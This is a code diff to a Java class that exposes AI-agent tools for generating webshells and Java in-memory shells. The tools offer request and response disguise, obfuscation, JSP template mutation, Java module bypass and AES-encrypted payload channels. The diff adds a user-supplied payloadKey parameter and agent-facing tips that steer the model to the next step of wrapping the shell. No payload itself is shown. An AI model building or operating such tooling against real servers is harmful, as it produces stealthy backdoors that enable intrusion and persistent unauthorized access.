@@ -158,6 +158,8 @@ public class ShellGeneratorTools {
                     required = false, defaultValue = "auto") String targetJavaVersion,
             @P(value = "Servlet 命名空间：auto/javax/jakarta；默认 auto",
                     required = false, defaultValue = "auto") String servletNamespace,
+            @P(value = "用户输入的 PayloadCodec AES 密钥；省略时使用请求 Disguise 的密钥",
+                    required = false) String payloadKey,
             @P(value = "混淆随机种子；省略时随机生成", required = false) Long obfuscationSeed) throws Exception {
         Disguise reqDisguise = requireDisguise(reqDisguiseId, "reqDisguiseId");
         Disguise respDisguise = requireDisguise(respDisguiseId, "respDisguiseId");
@@ -167,6 +169,7 @@ public class ShellGeneratorTools {
                         .coreClassName(coreClassName)
                         .targetJavaVersion(targetJavaVersion)
                         .servletNamespace(servletNamespace)
+                        .payloadKey(payloadKey)
                         .obfuscationSeed(obfuscationSeed)
                         .build());
         if ("websocket".equals(artifact.getProtocol().getValue())) {
@@ -183,7 +186,7 @@ public class ShellGeneratorTools {
         result.put("targetJavaVersion", artifact.getTargetJavaVersion().getValue());
         result.put("servletNamespace", artifact.getServletNamespace().getValue());
         result.put("obfuscationSeed", Long.toString(artifact.getObfuscationSeed()));
-        result.put("entrypoint", "equals(java.io.ByteArrayOutputStream)");
+        result.put("entrypoint", "InvocationHandler.invoke(null, null, new Object[]{buffer})");
         result.put("tip", "Core 仅保存在服务端（30 分钟有效）。下一步调用 designWebShellWrapper。不要索取或转述 Core Payload。");
         return result;
     }
@@ -311,6 +314,7 @@ public class ShellGeneratorTools {
           "outputMode 从 getShellGeneratorMeta 的 runtimeGenerators.php.outputModes 中选择：" +
           "compact 为默认精简源码，packed 需要 zlib/base64_decode/gzinflate，portable 为便于兼容排障的展开源码。" +
           "headerName 与 headerValue 必须同时设置或同时留空；respCode 默认 200；seed 留空时自动随机。" +
+          "payloadKey 必须由用户提供，用于 PHP PayloadCodec；不得使用默认密钥。" +
           "PHP 当前只支持 webshell，不支持 Java 内存马参数和 JSP 模板变异。")
     public Map<String, Object> generatePhpWebShell(
             @P("请求 Disguise ID") String reqDisguiseId,
@@ -323,6 +327,7 @@ public class ShellGeneratorTools {
             @P(value = "触发 Header 值；须与 headerName 同时提供", required = false) String headerValue,
             @P(value = "HTTP 响应码；默认200", required = false,
                     defaultValue = "200") Integer respCode,
+            @P("用户输入的 PHP PayloadCodec AES 密钥") String payloadKey,
             @P(value = "生成种子；省略时随机", required = false) String seed) throws Exception {
         Disguise reqDisguise = requireDisguise(reqDisguiseId, "reqDisguiseId");
         Disguise respDisguise = requireDisguise(respDisguiseId, "respDisguiseId");
@@ -348,6 +353,11 @@ public class ShellGeneratorTools {
             options.put("headerValue", headerValue.trim());
         }
         if (respCode != null) options.put("respCode", respCode);
+        if (payloadKey == null || payloadKey.trim().isEmpty()) {
+            throw AiToolException.modelCorrectable("MISSING_REQUIRED_FIELD", "payloadKey 不能为空",
+                    "请让用户提供 PHP 节点 PayloadCodec AES 密钥后重新生成。");
+        }
+        options.put("payloadKey", payloadKey.trim());
         if (!isBlank(seed)) options.put("seed", seed.trim());
 
         GeneratedArtifact artifact = scriptGeneratorService.generate(new GenerationRequest(
@@ -475,6 +485,8 @@ public class ShellGeneratorTools {
                     required = false, defaultValue = "false") Boolean byPassJavaModule,
             @P(value = "HTTP 响应码；默认200", required = false,
                     defaultValue = "200") Integer respCode,
+            @P(value = "用户输入的 PayloadCodec AES 密钥；省略时使用请求 Disguise 的密钥",
+                    required = false) String payloadKey,
             @P(value = "JSP 混淆步骤；省略时使用默认，空列表表示关闭",
                     required = false) List<String> jspObfuscationSteps,
             @P(value = "mutateJspTemplate 返回的自定义模板", required = false)
@@ -499,6 +511,7 @@ public class ShellGeneratorTools {
                         .abstractTranslet(isAbstractTranslet)
                         .bypassJavaModule(byPassJavaModule)
                         .responseCode(respCode)
+                        .payloadKey(payloadKey)
                         .obfuscationSteps(jspObfuscationSteps)
                         .customJspTemplate(customJspTemplate)
                         .build();
